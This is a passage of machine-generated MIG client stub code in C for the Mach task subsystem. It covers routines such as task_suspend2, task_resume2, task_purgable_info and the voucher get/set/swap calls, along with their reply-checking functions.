	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->suspend_token.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->suspend_token.disposition != 18) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_suspend2_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_suspend2 */
mig_external kern_return_t task_suspend2
(
	task_read_t target_task,
	task_suspension_token_t *suspend_token
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t suspend_token;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t suspend_token;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_suspend2_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_suspend2_t__defined */

	__DeclareSendRpc(3436, "task_suspend2")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3436;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3436, "task_suspend2")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3436, "task_suspend2")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_suspend2_t__defined)
	check_result = __MIG_check__Reply__task_suspend2_t((__Reply__task_suspend2_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_suspend2_t__defined) */

	*suspend_token = Out0P->suspend_token.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_resume2_t__defined)
#define __MIG_check__Reply__task_resume2_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_resume2_t(__Reply__task_resume2_t *Out0P)
{

	typedef __Reply__task_resume2_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3537) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_resume2_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_resume2 */
mig_external kern_return_t task_resume2
(
	task_suspension_token_t suspend_token
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_resume2_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_resume2_t__defined */

	__DeclareSendRpc(3437, "task_resume2")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(18, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = suspend_token;
	InP->Head.msgh_id = 3437;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3437, "task_resume2")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3437, "task_resume2")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_resume2_t__defined)
	check_result = __MIG_check__Reply__task_resume2_t((__Reply__task_resume2_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_resume2_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_purgable_info_t__defined)
#define __MIG_check__Reply__task_purgable_info_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_purgable_info_t(__Reply__task_purgable_info_t *Out0P)
{

	typedef __Reply__task_purgable_info_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3538) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_purgable_info_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_purgable_info */
mig_external kern_return_t task_purgable_info
(
	task_inspect_t task,
	task_purgable_info_t *stats
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		task_purgable_info_t stats;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		task_purgable_info_t stats;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_purgable_info_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_purgable_info_t__defined */

	__DeclareSendRpc(3438, "task_purgable_info")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3438;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3438, "task_purgable_info")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3438, "task_purgable_info")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_purgable_info_t__defined)
	check_result = __MIG_check__Reply__task_purgable_info_t((__Reply__task_purgable_info_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_purgable_info_t__defined) */

	*stats = Out0P->stats;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_mach_voucher_t__defined)
#define __MIG_check__Reply__task_get_mach_voucher_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_mach_voucher_t(__Reply__task_get_mach_voucher_t *Out0P)
{

	typedef __Reply__task_get_mach_voucher_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3539) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->voucher.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->voucher.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_mach_voucher_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_mach_voucher */
mig_external kern_return_t task_get_mach_voucher
(
	task_read_t task,
	mach_voucher_selector_t which,
	ipc_voucher_t *voucher
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_voucher_selector_t which;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_mach_voucher_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_mach_voucher_t__defined */

	__DeclareSendRpc(3439, "task_get_mach_voucher")

	InP->NDR = NDR_record;

	InP->which = which;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3439;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3439, "task_get_mach_voucher")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3439, "task_get_mach_voucher")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_mach_voucher_t__defined)
	check_result = __MIG_check__Reply__task_get_mach_voucher_t((__Reply__task_get_mach_voucher_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_mach_voucher_t__defined) */

	*voucher = Out0P->voucher.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_mach_voucher_t__defined)
#define __MIG_check__Reply__task_set_mach_voucher_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_mach_voucher_t(__Reply__task_set_mach_voucher_t *Out0P)
{

	typedef __Reply__task_set_mach_voucher_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3540) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_mach_voucher_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_mach_voucher */
mig_external kern_return_t task_set_mach_voucher
(
	task_t task,
	ipc_voucher_t voucher
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_mach_voucher_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_mach_voucher_t__defined */

	__DeclareSendRpc(3440, "task_set_mach_voucher")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t voucherTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->voucher = voucherTemplate;
	InP->voucher.name = voucher;
#else	/* UseStaticTemplates */
	InP->voucher.name = voucher;
	InP->voucher.disposition = 19;
	InP->voucher.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3440;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3440, "task_set_mach_voucher")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3440, "task_set_mach_voucher")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_mach_voucher_t__defined)
	check_result = __MIG_check__Reply__task_set_mach_voucher_t((__Reply__task_set_mach_voucher_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_mach_voucher_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_swap_mach_voucher_t__defined)
#define __MIG_check__Reply__task_swap_mach_voucher_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_swap_mach_voucher_t(__Reply__task_swap_mach_voucher_t *Out0P)
{

	typedef __Reply__task_swap_mach_voucher_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3541) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->old_voucher.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->old_voucher.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_swap_mach_voucher_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_swap_mach_voucher */
mig_external kern_return_t task_swap_mach_voucher
(
	task_t task,
	ipc_voucher_t new_voucher,
	ipc_voucher_t *old_voucher
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_voucher;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_swap_mach_voucher_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_swap_mach_voucher_t__defined */

	__DeclareSendRpc(3441, "task_swap_mach_voucher")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_voucherTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t old_voucherTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 2;
#if	UseStaticTemplates
	InP->new_voucher = new_voucherTemplate;
	InP->new_voucher.name = new_voucher;
#else	/* UseStaticTemplates */
	InP->new_voucher.name = new_voucher;
	InP->new_voucher.disposition = 19;
	InP->new_voucher.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

#if	UseStaticTemplates
	InP->old_voucher = old_voucherTemplate;
	InP->old_voucher.name = *old_voucher;
#else	/* UseStaticTemplates */
	InP->old_voucher.name = *old_voucher;
	InP->old_voucher.disposition = 19;
	InP->old_voucher.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3441;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3441, "task_swap_mach_voucher")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3441, "task_swap_mach_voucher")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_swap_mach_voucher_t__defined)
	check_result = __MIG_check__Reply__task_swap_mach_voucher_t((__Reply__task_swap_mach_voucher_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_swap_mach_voucher_t__defined) */

	*old_voucher = Out0P->old_voucher.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_generate_corpse_t__defined)
#define __MIG_check__Reply__task_generate_corpse_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_generate_corpse_t(__Reply__task_generate_corpse_t *Out0P)
{

	typedef __Reply__task_generate_corpse_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3542) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

